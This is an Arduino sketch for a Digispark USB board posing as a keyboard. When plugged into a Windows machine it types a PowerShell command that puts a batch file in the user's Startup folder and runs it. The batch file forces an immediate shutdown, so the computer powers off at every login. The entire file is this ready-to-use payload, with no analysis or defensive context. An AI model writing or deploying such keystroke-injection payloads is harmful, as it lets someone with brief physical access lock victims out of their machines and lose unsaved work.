#include "DigiKeyboard.h"

void setup() {
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(500);
    DigiKeyboard.print("powershell");
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(750);
    DigiKeyboard.println("$batFilePath=\"$env:AppData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\shutdown.bat\"; $batFileContent=\"@echo off`nshutdown /s /f /t 0\"; Set-Content -Path $batFilePath -Value $batFileContent; Start-Process -FilePath $batFilePath");
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
}

void loop() {
  // Dont touch
}
